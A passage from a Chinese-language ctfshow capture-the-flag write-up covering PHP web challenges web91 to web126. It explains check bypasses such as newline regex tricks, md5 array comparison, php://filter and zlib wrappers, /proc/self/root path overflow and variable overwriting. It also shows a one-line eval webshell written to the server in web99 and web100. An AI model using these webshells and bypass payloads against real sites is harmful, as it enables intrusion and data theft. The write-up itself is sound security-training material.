alt="image-20221218212029537"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212822855.png" alt="image-20221218212822855"></p><p>这里解释了<code>^php$/im</code>的意思     m是多行匹配的意思</p><p>^    —-&gt;是指仅匹配/p开头的字符串</p><p>$    —-&gt;是指仅匹配/p结尾的字符串</p><p><a href="https://bbs.csdn.net/topics/320227966">https://bbs.csdn.net/topics/320227966</a></p><p>这篇文章讲解了php正则遇到的所有符号的含义</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213049399.png" alt="image-20221218213049399"></p><!--为什么可以这样写拿到flag呢，因为第一个if是多行匹配，然后就会形成回车  php,然后就会检索第一行，发现没有php后会接着检索第二行，但是第二个if的话，就是单行匹配，只会匹配到回车符号，然后就结束了，不会接着匹配下一行的php--><p> <code>%0aphp</code>是这样的</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218213434661.png" alt="image-20221218213434661"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214708879.png" alt="image-20221218214708879"></p><p>用4476的16进制或者8进制都能绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214745883.png" alt="image-20221218214745883"></p><p><strong>解法2：</strong></p><p><code>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</code></p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218214938240.png" alt="image-20221218214938240"></p><p>虽然过滤了字母   我们还可以用8进制表示</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215152296.png" alt="image-20221218215152296"></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215237018.png" alt="image-20221218215237018"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218215849892.png" alt="image-20221218215849892"></p><p>先用4476_过滤掉第一个和第二个if，因为第三个函数要求参数里必须得有0，所以在末尾加一个0，就能成功绕过了。</p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220051775.png" alt="image-20221218220051775"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220710727.png" alt="image-20221218220710727"></p><p>加号或者空格都能绕过     这两个的url编码也能绕过。</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218220854093.png" alt="image-20221218220854093"></p><p> <strong>解法一</strong></p><p>利用php为协议</p><p><code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151615862.png" alt="image-20221219151615862"></p><p><strong>解法二</strong></p><p><code>./</code>代表当前目录下  所以</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151722800.png" alt="image-20221219151722800"></p><p><strong>解法三</strong></p><p>利用当前目录的路径</p><p><code>/var/www/html</code></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219151841812.png" alt="image-20221219151841812"></p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152132776.png" alt="image-20221219152132776"></p><p>利用数组绕过md5强等于</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152207405.png" alt="image-20221219152207405"></p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219152512769.png" alt="image-20221219152512769"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219155526819.png" alt="image-20221219155526819"></p><p>这道题考察的是一个三元运算符</p><!--if(条件)?true:false-->     就是条件成立的话返回true里的值     不成立的返回false里的值首先先分析代码，$_GET如果刚开始没赋值的话就会被强制转换为一个字符串，那么下面的条件都不会成立了，因为$__GET必须得是个数组才能拿到flag,**第一步**得先给GET随便传点值让其为true使其返回```$_GET=&$_POST```变成post型的数组，然后下一行的$_GET就会变成$__POST。**第二步**然后给POST的flag传值为flag，使其转为COOKIE,那么第三行的$__GET就会变成$—COOKIE ，又因为COOKIE的flag没有没有值，就会返回flag，而不是SERVER。**最后一步**所以最后一行的GET就为CCOKIE了，最后只要在COOKIE里添加HTTP_FLAG=flag就可以成功输出flag了## web99源码![image-20221219160616968](C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219160616968.png)array_push()   --->的意思是靠rand(1,$i)在1到$i之间产生的随机数，然后赋值到$allow尾部里in_array()   ----> 判断$_GET里的值是否在$allow里这道题就存在这个漏洞在这里。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163711057.png" alt="image-20221219163711057"></p><p>所以就可以利用这个漏洞。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163915275.png" alt="image-20221219163915275"></p><p>先看数组里有没有3这个数字，有的话看能不能写入东西。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219163942094.png" alt="image-20221219163942094"></p><p>能写入，然后就可以进行getshell了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在content处写入   &lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164220854.png" alt="image-20221219164220854"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219164409059.png" alt="image-20221219164409059"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题先看$v0那里，是赋值和逻辑运算符相加在一起，但是逻辑运算符的的优先级没有赋值的高，所以这里只需要看v1就行，后面的不一定得是数字了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219171715178.png" alt="image-20221219171715178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为v2不能带;，所以用?&gt;把它给替换掉了 %23是#号，把后面的东西给过滤掉了。v2就是传一句话木马，为什么可以这样写呢，就是eval比较特殊，他是这样的&lt;?php  所以我们前面加的?&gt;是为了与它闭合</span><br><span class="line"> ctfshow.php是/var/www/html目录下的   因为flag36d.txt是假的flag.</span><br></pre></td></tr></table></figure><p>0x2d   —-&gt;   指的是-     替换后以ctfshow{xxxx}提交就行</p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219172440204.png" alt="image-20221219172440204"></p><p>这道题考察的是反射类的含义，我也不太懂。。。。。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205625421.png" alt="image-20221219205625421"></p><p>因为flag一般是uuid的，有16位ui，这才有15位，所以得加一个在最后一个位置上   <strong>0-f</strong></p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219205806760.png" alt="image-20221219205806760"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题的难点是如何构造v2,看了题目给的解后才发现</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223237023.png" alt="image-20221219223237023"></p><p>它这个构造就很巧妙了，因为这个e可以当作科学计数法来看，所以刚好符合题目要求。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223434325.png" alt="image-20221219223434325"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219223442861.png" alt="image-20221219223442861"></p><p>这个就是先进行base64编码，然后在进行16进制转换得到的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个前面构造的16进制前面的数字相当于0x，可以不要，去掉也不影响，所以为了能绕过，就给0x替换成11了.</span><br></pre></td></tr></table></figure><p>因为题目给的substr会把前两位给去掉，所以不影响最终结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后v3传的php伪协议是解码的，所以是先进行16进制转换，然后在进行base64解码，然后写入2.php里。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219224415157.png" alt="image-20221219224415157"></p><p>访问2.php得到flag。</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219225709345.png" alt="image-20221219225709345"></p><p>和上一题的解法一样</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230835495.png" alt="image-20221219230835495"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219230941622.png" alt="image-20221219230941622"></p><p>和md5差不多，都是加密函数</p><p>也可以利用数组绕过。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219231030575.png" alt="image-20221219231030575"></p><p>直接令值相等也行。</p><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219234917550.png" alt="image-20221219234917550"></p><p>foreach里面指的就是这个  —-&gt; $_GET[key]=value</p><p><script type="math/tex">key=</script>value;   ——- &gt;这个是值覆盖</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221219235048002.png" alt="image-20221219235048002"></p><p>自己看pl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一步，suces=flag的原因是为了绕过第一行的foreach里面的die()，所以利用了suces,然后根据值覆盖，suces就等于$flag.然后第二个post的话，就是为了绕过die()，然后进行值覆盖，那么error就等于$flag了，然后因为没有post flag,所以执行die($error)就等于die($flag).然后就会输出flag.</span><br></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143719767.png" alt="image-20221220143719767"></p><p>这道题可以利用数组绕过</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143807143.png" alt="image-20221220143807143"></p><p>这样就可以拿到flag.</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220143934377.png" alt="image-20221220143934377"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145147822.png" alt="image-20221220145147822"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">思路就是给v1随便给个值，因为找不到flag这个key，所以会返回false,然后md5传一个数组，md5也不会解析数组，也会返回false.所以相等，然后就会输出flag.</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145531165.png" alt="image-20221220145531165"></p><p>这就是官方解，给的数字的含义。</p><p><a href="https://blog.csdn.net/qq_63548648/article/details/128144485">https://blog.csdn.net/qq_63548648/article/details/128144485</a>    可以看下我写的</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220145632097.png" alt="image-20221220145632097"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220154959505.png" alt="image-20221220154959505"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00是一个截断字符，就是代表着一个字符串到这就结束了，后面的东西将不会在继续遍历了。</span><br></pre></td></tr></table></figure><p>所以第一个if就是一个以a开头并且以a结尾的一个字符串。然后因为36d转为10进制是877，然后根据题目给的逆转函数就得输入778，然后函数逆转就可以等于36d了。</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220155405748.png" alt="image-20221220155405748"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162752867.png" alt="image-20221220162752867"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加号的含义就是有一个是字母就行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题学到了很多东西，就是利用exception::__toString   这个内置函数</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220162429252.png" alt="image-20221220162429252"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数就是echo new Exception(&#x27;aaaa&#x27;)  ---&gt;会直接输出aaaa的报错信息  那么就可以利用这个来进行rce了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种就是 $a=&#x27;phpinfo&#x27;;$a();   这种就会直接输出phpinfo()的界面</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163200636.png" alt="image-20221220163200636"></p><p>然后直接访问fl36dg.txt，就可以直接拿到flag。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220163250189.png" alt="image-20221220163250189"></p><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220165208448.png" alt="image-20221220165208448"></p><p>这道题因为好多东西都被🈲了，那么只能用字母了，那么system(ls)肯定行不通了，那么我们就得去寻找其他可以用来查看目录的方法了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//filesystemiterator  是一个内置类，用来遍历文件  //继承类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//directoryItrerator  是一个内置类，用来遍历目录  //父类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这种类型的题都是利用toString方法  echo new xxxxxxxx;</span><br></pre></td></tr></table></figure><p><strong>写法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(diename(__FILE__))</span><br></pre></td></tr></table></figure><p><strong>写法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(&#x27;.&#x27;)   .  ----&gt;是指当前目录</span><br></pre></td></tr></table></figure><p><strong>写法三</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(/var/www/html)</span><br></pre></td></tr></table></figure><p><strong>写法四</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directoryItrerator(getcwd())   getcwd()  ----&gt; 取得当前工作目录</span><br></pre></td></tr></table></figure><p><strong>写法五</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator(getcwd())   ---&gt;只会返回当前文件目录的第一个文件</span><br></pre></td></tr></table></figure><p><strong>写法六</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filesystemiterator  也可以利用   directoryItrerator上面的写法，方法是一样的</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220170850889.png" alt="image-20221220170850889"></p><p>这里的文件名排序是按照文件首字母来排序的，因为f排在前面，所以先输出flag。</p><p>然后访问fl36dga.txt就能拿到flag了。</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220171126721.png" alt="image-20221220171126721"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题考察的点是值覆盖，因为v1只需要包含ctfshow就行，那么想要拿到flag，就得用v2给v1覆盖掉，因为函数体内访问的值，只能访问传进来的，因为进行值覆盖了，所以访问不到，那么就得使用全局变量来进行访问了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211211535.png" alt="image-20221220211211535"></p><p>利用的是GLOBALS,全局变量。</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>源码</p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220211312978.png" alt="image-20221220211312978"></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这道题通过过滤的东西，和is_file()这个函数，就能判断出这是需要php伪协议做的</span><br><span class="line">is_file()   这个可以不影响file_get_contents   highlight_file</span><br></pre></td></tr></table></figure><p>is_file()  </p><p><strong><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220212932303.png" alt="image-20221220212932303"></strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213031242.png" alt="image-20221220213031242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为php://filter/resource=flag.php  不是一个文件名，所以会返回false，绕过第一层的if判断，然后通过php伪协议传的flag.php就可以成功输出了。  这个伪协议是把过滤器给去掉后的样子</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213352149.png" alt="image-20221220213352149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不去掉利用别的过滤器也行，这是官方的wp</span><br></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220213618137.png" alt="image-20221220213618137"></p><p>这道题把php://filter协议给过滤掉了。那我们可以尝试下zlip协议</p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a>   这篇文章把好几种可以用到的协议都总结到一起了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214343035.png" alt="image-20221220214343035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就是zlip协议的用法。</span><br></pre></td></tr></table></figure><p>下面是官方的解法</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214452423.png" alt="image-20221220214452423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是用了目录溢出的方法，可以记记，当作一个积累</span><br></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220214604506.png" alt="image-20221220214604506"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还有一种伪协议是glob://flag.php    但是这题用不了，因为就是这个返回的是一个数组，highlight_file不能高亮一个数组，所以可以当个积累。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仔细瞧瞧，发现这里没过滤filter,那么就可以用老办法来试一下了。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215659735.png" alt="image-20221220215659735"></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220215805366.png" alt="image-20221220215805366"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220221842229.png" alt="image-20221220221842229"></p><p>这个是trim()函数会删掉的东西，不过我们也可以把这个当作一个知识点，就是以后碰到这种需要判断数字的时候，可以利用这些字符来绕过。当然，看到这里，发现缺了个<code>0x0C</code>,刚好可以利用来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地试了一下发现%0c36可以绕过is_numeric</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$num!==&#x27;36&#x27;  这个是个强等于，因为%0c36不是字符串，所以也可以绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trim($num)!==&#x27;36&#x27;  因为trim()不会把%0c给去掉，那么也可以进行绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter($num)==&#x27;36&#x27;   这个函数里面也没有把%0c过滤的东西，也可以成功返回36</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有疑问的是这个$num==&#x27;36&#x27;  和  $num!==&#x27;36&#x27;  这就涉及到了一个强等于和弱类型比较的问题了，==表示的是值相等就行，===表示的是值和类型都必须相等。</span><br></pre></td></tr></table></figure><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222611713.png" alt="image-20221220222611713"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222727063.png" alt="image-20221220222727063"></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221220222813626.png" alt="image-20221220222813626"></p><p>这里有个命名的规则就是吗，php中变量名只能由数字字母和下划线组成，如果变量名不是这样的话，就会被强制转化，但php只会转换一次，那么就可以利用这一特点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果变量名中有 空格 + [  则会被转化成  _</span><br></pre></td></tr></table></figure><p><strong>implode</strong>    —-&gt;就是将数组以字符串的形式进行输出</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215115138.png" alt="image-20221221215115138"></p><p><strong>get_defined_vars</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215244737.png" alt="image-20221221215244737"></p><p>这道题可以使用这两个东西来解。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215529027.png" alt="image-20221221215529027"></p><p>试了一下，发现<code>echo</code>可以用  那么可以尝试直接<code>echo $flag</code>.</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215640332.png" alt="image-20221221215640332"></p><p>拿到flag，或者也可以上面的两种函数的结合方法。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215751225.png" alt="image-20221221215751225"></p><p>也可以直接拿到flag.</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221215903203.png" alt="image-20221221215903203"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次要使用POST的方法提交数据，extract($_POST)会将POST的数据中的键名和键值转换为相应的变量名和变量值</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET)  和post一样</span><br></pre></td></tr></table></figure><p>那么传fl0g就可以直接用<strong>post</strong>传了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222623391.png" alt="image-20221221222623391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_export()还是可以替代var_dump来用</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221222913484.png" alt="image-20221221222913484"></p><p>show_source();   一样的效果</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221221223023719.png" alt="image-20221221223023719"></p><p>这题开始判断长度了</p><p><strong>parse_str</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164714051.png" alt="image-20221222164714051"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221222164510131.png" alt="image-20221222164510131"></p><p>那么我们就可以知道parse_str是干什么的了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就是将一串字符串来解析成数组的形式并存储在设定的数组里，而+会起到分割作用，如果不分割的话，可能会像上图一样变成只有一个下标为0的一个数组，如果有加号分割的话，就会变成有下标分别为0和1的数组，那么现在就已经把这个函数的运用全部讲完了。</span><br></pre></td></tr></table></figure><p><strong>回到题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。</span><br><span class="line">不同的参数保存不同的信息，比如，</span><br><span class="line">$_SERVER[&#x27;argv&#x27;] //传递给该脚本的参数。</span><br><span class="line">$_SERVER[&#x27;argc&#x27;] //传递给程序的命令行参数的个数。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=$_SERVER[&#x27;argv&#x27;];   是个空数组</span><br></pre></td></tr></table></figure><p>那么我们就可以利用parse_str往数组里面传值。</p><p><strong>解法一</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br><span class="line">//这下数组a里面就会有key值分别为0和1的值  